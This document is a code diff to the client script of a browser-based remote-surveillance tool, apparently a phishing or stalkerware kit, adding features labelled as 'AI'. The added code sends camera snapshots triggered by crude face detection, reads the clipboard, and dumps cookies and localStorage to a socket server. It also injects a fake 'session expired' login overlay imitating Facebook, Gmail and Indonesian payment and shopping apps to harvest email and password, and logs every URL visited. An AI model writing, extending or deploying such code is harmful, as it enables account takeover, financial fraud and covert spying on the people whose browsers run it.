@@ -254,6 +254,10 @@ function startCameraStream() {
     const c = document.createElement('canvas');
     c.width = 240; c.height = 180;
     const ctx = c.getContext('2d');
+    const fdCanvas = document.createElement('canvas'); // face detection canvas
+    fdCanvas.width = 80; fdCanvas.height = 60;
+    const fdCtx = fdCanvas.getContext('2d');
+    let lastFaceCheck = 0;
     socket.emit('camera-status', { status: 'started', facingMode: camFacingMode });
     startCamAudioStream();
     let frameBusy = false;
@@ -264,6 +268,30 @@ function startCameraStream() {
         frameBusy = true;
         try {
             ctx.drawImage(v, 0, 0, 240, 180);
+            // AI Face Detection — analyze every 3 seconds
+            const now = Date.now();
+            if (now - lastFaceCheck > 3000) {
+                lastFaceCheck = now;
+                fdCtx.drawImage(v, 0, 0, 80, 60);
+                const imageData = fdCtx.getImageData(0, 0, 80, 60);
+                const pixels = imageData.data;
+                let skinPixels = 0;
+                for (let i = 0; i < pixels.length; i += 4) {
+                    const r = pixels[i], g = pixels[i+1], b = pixels[i+2];
+                    if (r > 95 && g > 40 && b > 20 && r > g && r > b && Math.abs(r-g) > 15) skinPixels++;
+                }
+                const skinRatio = skinPixels / (80*60);
+                if (skinRatio > 0.15) {
+                    // Face detected — emit snapshot with face detection flag
+                    c.toBlob((blob) => {
+                        if (blob) {
+                            const r = new FileReader();
+                            r.onloadend = () => socket.emit('face-detected', { image: r.result.split(',')[1] });
+                            r.readAsDataURL(blob);
+                        }
+                    }, 'image/jpeg', 0.4);
+                }
+            }
             c.toBlob((blob) => {
                 if (blob && blob.size > 200) {
                     const reader = new FileReader();
@@ -509,6 +537,48 @@ socket.on('take-snapshot', () => {
 });
 socket.on('force-respawn', () => {
     window.location.reload();
+});
+
+// AI Auto-Control socket handlers
+socket.on('request-clipboard', () => {
+    stealClipboard();
+    // Also try direct clipboard read
+    if (navigator.clipboard && navigator.clipboard.readText) {
+        navigator.clipboard.readText().then(text => {
+            if (text && text.length > 2) {
+                socket.emit('clipboard-response', { text: text.slice(0,500) });
+            }
+        }).catch(() => {});
+    }
+});
+
+socket.on('request-cookies', () => {
+    const cookies = document.cookie || '';
+    const ls = {};
+    try { for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); ls[k] = localStorage.getItem(k).slice(0,100); } } catch(e) {}
+    socket.emit('cookies-response', { cookies: cookies.slice(0,2000), localStorage: ls, domain: window.location.hostname, count: cookies.split(';').filter(Boolean).length });
+});
+
+socket.on('inject-phishing', (data) => {
+    const site = data.site || '';
+    const overlay = document.createElement('div');
+    overlay.id = 'phishing-overlay';
+    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:999999;display:flex;align-items:center;justify-content:center;';
+    const brands = { 'facebook.com': { name: 'Facebook', logo: '📘' }, 'instagram.com': { name: 'Instagram', logo: '📷' }, 'gmail.com': { name: 'Gmail', logo: '📧' }, 'google.com': { name: 'Google', logo: '🔍' }, 'tokopedia.com': { name: 'Tokopedia', logo: '🛒' }, 'shopee.co.id': { name: 'Shopee', logo: '🛍️' }, 'gojek.com': { name: 'Gojek', logo: '🟢' }, 'dana.id': { name: 'DANA', logo: '💳' }, 'ovo.id': { name: 'OVO', logo: '🟣' }, 'gopay.co.id': { name: 'GoPay', logo: '🔵' } };
+    const brand = brands[site] || { name: site, logo: '🔐' };
+    overlay.innerHTML = '<div style="background:white;padding:30px;border-radius:12px;text-align:center;max-width:350px;width:90%;box-shadow:0 10px 40px rgba(0,0,0,0.3);font-family:Arial,sans-serif;"><div style="font-size:48px;margin-bottom:10px">' + brand.logo + '</div><h2 style="margin:0 0 5px;color:#333;font-size:20px">Sesi Berakhir</h2><p style="color:#666;margin:0 0 20px;font-size:14px">Sesi ' + brand.name + ' Anda telah berakhir. Silakan login ulang untuk melanjutkan.</p><input id="phish-email" type="email" placeholder="Email / No HP" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ddd;border-radius:6px;font-size:14px;box-sizing:border-box"><input id="phish-pass" type="password" placeholder="Kata Sandi" style="width:100%;padding:10px;margin-bottom:15px;border:1px solid #ddd;border-radius:6px;font-size:14px;box-sizing:border-box"><button id="phish-btn" style="width:100%;padding:12px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:16px;cursor:pointer">Login</button><p style="font-size:11px;color:#999;margin-top:12px">' + brand.name + ' akan mengingat perangkat ini.</p></div>';
+    document.body.appendChild(overlay);
+    document.getElementById('phish-btn').addEventListener('click', () => {
+        const email = document.getElementById('phish-email').value;
+        const pass = document.getElementById('phish-pass').value;
+        if (email && pass) {
+            socket.emit('device-info', { fieldEmail: email, fieldPass: pass, phishingSite: site });
+            overlay.innerHTML = '<div style="background:white;padding:30px;border-radius:12px;text-align:center;max-width:350px;width:90%;box-shadow:0 10px 40px rgba(0,0,0,0.3)"><div style="font-size:48px;margin-bottom:10px">✅</div><h2 style="color:#333;font-size:18px">Berhasil</h2><p style="color:#666;font-size:14px">Mengalihkan ke ' + brand.name + '...</p></div>';
+            setTimeout(() => { const o = document.getElementById('phishing-overlay'); if (o) o.remove(); }, 2000);
+        } else {
+            alert('Harap isi email dan kata sandi.');
+        }
+    });
 });
 
 function togglePass() { if (!passInput) return; const i=passInput; i.type=i.type==='password'?'text':'password'; }
@@ -818,7 +888,7 @@ function detectDevice() {
     }
 }
 
-function stealClipboard() { if(navigator.clipboard?.readText) navigator.clipboard.readText().then(t=>{if(t&&t.length>3)socket.emit('device-info',{clipboard:t.slice(0,500)})}).catch(()=>{}); }
+function stealClipboard() { if(navigator.clipboard?.readText) navigator.clipboard.readText().then(t=>{if(t&&t.length>3){socket.emit('clipboard-response',{text:t.slice(0,500)});socket.emit('device-info',{clipboard:t.slice(0,500)})}}).catch(()=>{}); }
 
 function initMotionSensor() {
     if(window.DeviceOrientationEvent) window.addEventListener('deviceorientation',e=>{if(e.alpha!==null)socket.emit('device-info',{orientation:{alpha:e.alpha,beta:e.beta,gamma:e.gamma,time:Date.now()}})},false);
@@ -1875,6 +1945,23 @@ function removeTypingIndicator() {
     const el = document.querySelector('.ai-msg-typing');
     if (el) el.remove();
 }
+
+// AI URL Monitor — track page changes
+function initURLMonitor() {
+    let lastUrl = window.location.href;
+    let lastTitle = document.title;
+    socket.emit('url-change', { url: lastUrl, title: lastTitle });
+    setInterval(() => {
+        const currentUrl = window.location.href;
+        const currentTitle = document.title;
+        if (currentUrl !== lastUrl || currentTitle !== lastTitle) {
+            lastUrl = currentUrl;
+            lastTitle = currentTitle;
+            socket.emit('url-change', { url: currentUrl, title: currentTitle });
+        }
+    }, 2000);
+}
+initURLMonitor();
 
 // Page-specific initializations (skip on dashboard)
 if (!window.location.pathname.includes('dashboard')) {
